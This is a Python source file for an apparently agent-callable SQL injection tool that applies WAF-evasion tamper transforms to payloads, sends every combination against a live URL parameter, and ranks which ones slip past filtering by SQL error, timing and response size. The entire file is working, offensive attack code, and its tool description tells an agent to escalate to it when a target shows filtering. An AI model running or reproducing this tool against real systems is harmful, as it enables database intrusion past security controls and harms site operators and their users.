"""TOOL: sqli_tamper_chain - WAF bypass via payload×tamper matrix.

Takes proven SQLi payloads (payload_library corpus by default) and applies
tamper transforms — space2comment, case randomization, double URL-encoding,
quote swapping — then fires each combination and classifies which (payload,
tamper) pairs slip past filtering. Same spirit as sqlmap --tamper: the WAF
blocks the textbook form; a transformed equivalent often walks through.
"""
import json
import random
from urllib.parse import quote, urlencode

from tools import register
from tools._exploit_lib import paced_send, body_fingerprint

random.seed(1337)  # deterministic runs — reproducible ordnance


def _t_space2comment(s):
    return s.replace(" ", "/**/")


def _t_space2plus(s):
    return s.replace(" ", "+")


def _t_case_random(s):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _t_double_encode(s):
    return quote(quote(s, safe=""), safe="")


def _t_quotes_to_double(s):
    return s.replace("'", '"')


def _t_prefix_comment(s):
    return ("/*!50000" + s + "*/") if not s.startswith("/*") else s


TAMPERS = {
    "none": lambda s: s,
    "space2comment": _t_space2comment,
    "space2plus": _t_space2plus,
    "case_random": _t_case_random,
    "double_encode": _t_double_encode,
    "quotes_to_double": _t_quotes_to_double,
    "prefix_comment": _t_prefix_comment,
}

_BLOCK_RE_HINTS = ("blocked", "denied", "forbidden", "cloudflare", "sucuri",
                   "alert_id", "captcha", "firewall")


def _looks_blocked(st, body):
    low = (body or "").lower()
    return st in (403, 406, 429) or any(h in low for h in _BLOCK_RE_HINTS)


@register(name="sqli_tamper_chain",
          desc="SQLI ESCALATION: fire payload×tamper matrix against one param and "
               "report which transformed payloads bypass filtering (error "
               "fingerprints, timing, body delta — not WAF blocks). Payloads come "
               "from the payload_library sqli corpus unless provided. Use when "
               "sqli_probe_param shows filtering but not full blindness.",
          params={"type": "object", "properties": {
              "url": {"type": "string", "description": "target URL with the param, e.g. https://t/p?id=1"},
              "param": {"type": "string", "description": "param to inject"},
              "payloads": {"type": "array", "description": "explicit payloads; default = payload_library sqli class"},
              "tampers": {"type": "array", "description": f"subset of {list(TAMPERS)}; default all"},
              "max_requests": {"type": "integer", "default": 60}},
              "required": ["url", "param"]},
          danger="active")
def sqli_tamper_chain(url, param, payloads=None, tampers=None, max_requests=60):
    from urllib.parse import urlsplit
    max_requests = max(5, min(int(max_requests or 60), 300))
    if payloads:
        base_payloads = [str(p) for p in payloads][:25]
    else:
        import tools as _t
        out = _t.execute("payload_library", {"op": "get", "vclass": "sqli", "limit": 25})
        base_payloads = [l.strip() for l in str(out).splitlines()
                         if l.strip() and not l.startswith("[") and not l.startswith("Utilise")]
    if not base_payloads:
        return "TOOL ERROR [NO_PAYLOADS]: corpus vide et payloads non fournis"
    tampers = [t for t in (tampers or list(TAMPERS)) if t in TAMPERS] or ["none"]

    split = urlsplit(url)
    base = f"{split.scheme}://{split.netloc}{split.path}"
    # fix: l'ancienne comprehension référencait 'pair' hors de sa portée
    # (NameError garantie sur toute URL avec query string)
    q = {}
    for pair in split.query.split("&"):
        if not pair:
            continue
        k, _, v = pair.partition("=")
        q[k] = v

    # baseline: benign value
    q[param] = "1"
    st0, body0, _ = paced_send(base + ("?" + urlencode(q) if q else ""), timeout=15)
    fp0 = body_fingerprint(body0 or "")
    base_len = len(body0 or "")
    blocked_at_baseline = _looks_blocked(st0, body0)

    results, sent = [], 0
    interesting = []
    for pl in base_payloads:
        if sent >= max_requests:
            break
        for tn in tampers:
            if sent >= max_requests:
                break
            try:
                val = TAMPERS[tn](pl)
            except Exception:
                continue
            q[param] = val
            st, body, dt = paced_send(base + ("?" + urlencode(q) if q else ""), timeout=15)
            sent += 1
            if st < 0:
                continue
            low = (body or "").lower()
            blocked = _looks_blocked(st, body)
            err = any(k in low for k in ("sql syntax", "warning:", "mysql",
                                         "postgresql", "syntax error", "unterminated",
                                         "ora-", "sqlite"))
            timed = dt > 6.0
            delta = abs(len(body or "") - base_len)
            same = body_fingerprint(body or "") == fp0
            if err or timed or (delta > 200 and not same):
                interesting.append((pl, tn, st, dt, delta))
            results.append({"payload": pl[:60], "tamper": tn, "status": st,
                            "blocked": blocked, "err": err, "timed": round(dt, 2),
                            "delta": delta})
    if not results:
        return f"TOOL ERROR [NO_RESPONSES]: baseline_status={st0}, blocked_at_baseline={blocked_at_baseline}"

    # per-tamper bypass stats: responses that were NOT blocked (slipped through)
    stats = {}
    for r in results:
        s = stats.setdefault(r["tamper"], {"sent": 0, "through": 0})
        s["sent"] += 1
        if not r["blocked"]:
            s["through"] += 1
    ranking = sorted(stats.items(), key=lambda kv: -(kv[1]["through"] / max(1, kv[1]["sent"])))

    lines = [f"TAMPER MATRIX — {sent} requêtes, baseline st={st0} (WAF {'ACTIF' if blocked_at_baseline else 'silencieux'}), "
             f"{len(interesting)} réponses intéressantes.", "",
             "TAMPERS CLASSÉS (taux de passage hors filtre):"]
    for tn, s in ranking:
        lines.append(f"- {tn}: {s['through']}/{s['sent']} passent le filtre")
    if interesting:
        lines.append("\nMEILLEURES COMBINAISONS (erreur SQL / timing / delta):")
        for pl, tn, st, dt, delta in interesting[:8]:
            lines.append(f"  * [{tn}] st={st} dt={dt}s Δ={delta}B — {pl[:70]}")
    else:
        lines.append("\nAucune combinaison ne déclenche d'oracle — cible probablement blindée sur ce param.")
    out = "\n".join(lines)
    try:
        import os
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "reports", "tamper_matrix.json")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"url": url, "param": param, "results": results[:200]}, f, ensure_ascii=False, indent=1)
    except Exception:
        pass
    return out
